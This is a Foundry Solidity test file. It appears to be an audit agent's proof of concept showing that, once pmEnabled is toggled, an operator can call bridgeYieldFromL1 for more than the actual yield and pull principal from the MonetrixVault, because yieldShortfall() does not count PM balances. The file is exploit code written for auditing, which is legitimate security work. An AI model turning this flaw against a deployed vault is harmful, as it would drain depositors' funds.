// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import "test/ActionEncoderBoundCheck.t.sol";
import "../src/core/MonetrixVault.sol";
import "../src/interfaces/HyperCoreConstants.sol";

// ATTACK TIMELINE:
// 1. [Setup] Deposit funds, bridge to L1, and settle to establish baseline surplus and OLP.
// 2. [T=1] Governor toggles pmEnabled to true via setPmEnabled(true).
// 3. [T=2] State changes: _sendL1Bridge now includes PM suppliedBalance in l1Available capacity, but Accountant surplus() and yieldShortfall() do not yet reflect PM balances since no new settle occurred.
// 4. [T=3] Operator calls bridgeYieldFromL1 with an amount exceeding actual yield but within the inflated L1 capacity.
// 5. [Assert] Verify that outstandingL1Principal decreased, proving principal was pulled from the PM pool due to the yieldShortfall() asymmetry.

contract AuditAgentPoC is ToL1WeiHarness {
    function test_exploit() public {
        vm.etch(HyperCoreConstants.CORE_WRITER, address(new MockCoreWriter()).code);
        _mockVaultL1SpotUsdc(type(uint64).max);

        // 1. Setup: Deposit and bridge to establish OLP
        _depositAs(user1, 100_000e6);
        vm.warp(block.timestamp + 6 hours);
        vm.prank(operator);
        vault.keeperBridge(MonetrixVault.BridgeTarget.Vault);

        // Settle with some recognized yield
        _primeDistributable(5_000e6);

        // 2. Toggle pmEnabled to true
        vm.prank(governor);
        vault.setPmEnabled(true);

        // 3. Record state before exploit
        uint256 principalBefore = vault.outstandingL1Principal();
        uint256 shortfall = vault.yieldShortfall();

        // 4. Exploit: Bridge yield that exceeds actual yield but is covered by PM capacity
        // Because pmEnabled is true, _sendL1Bridge adds suppliedBalance to l1Available.
        // yieldShortfall() does not account for this, allowing the bridge to pull principal.
        vm.prank(operator);
        vault.bridgeYieldFromL1(10_000e6); // Exceeds the 5k actual yield

        uint256 principalAfter = vault.outstandingL1Principal();

        // 5. Assert that principal was pulled (OLP decreased) due to the asymmetry
        assertLt(principalAfter, principalBefore, "Principal was pulled from PM pool due to yieldShortfall asymmetry");
    }
}
